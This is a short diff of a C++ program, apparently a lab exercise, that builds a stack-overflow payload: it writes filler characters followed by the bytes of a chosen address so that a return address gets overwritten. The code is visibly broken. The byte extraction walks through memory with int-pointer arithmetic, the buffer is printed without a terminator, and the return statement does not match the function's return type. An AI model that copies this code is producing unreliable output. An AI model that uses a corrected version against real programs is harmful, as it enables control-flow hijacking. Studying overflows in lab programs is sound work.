@@ -30,11 +30,14 @@ string getSolution(int addr){
 	cout << "Filler length = " << filler << "\nAddr = ";
 	cout << hex << addr;
 	cout << endl;
-	char char_arr[filler+1];
+	char char_arr[filler+4];
 	for(int i=0; i<filler; i++){
 		char_arr[i] = 's';
 	}
-	char_arr[filler] = (char) input;
+	for(int i=filler; i<filler+4; i++){
+		char_arr[i] = *((char *) (&addr + sizeof(char) * (i-filler)));
+	}
+	cout << "Generated output string: " << char_arr << endl;
 	return &(new string(char_arr));
 }
 
@@ -50,7 +53,7 @@ cout << "BUFSIZE: " << BUFSIZE << endl;
 		string arg;
 		cout << "Input \"password\" or \"AUTO:(addr)\"" << endl;
 		getline(cin, arg);
-		if(arg.c_str[0]=='A' && arg.c_str[1]=='U' && arg.c_str[2]=='T' && arg.c_str[3]=='O' && arg.c_str[4]==':'){
+		if(arg.c_str()[0]=='A' && arg.c_str()[1]=='U' && arg.c_str()[2]=='T' && arg.c_str()[3]=='O' && arg.c_str()[4]==':'){
 			int addr = stoi(arg.substr(5, string::npos), NULL, 16);
 			cout << "User has input \"AUTO:";
 			cout << hex << addr;
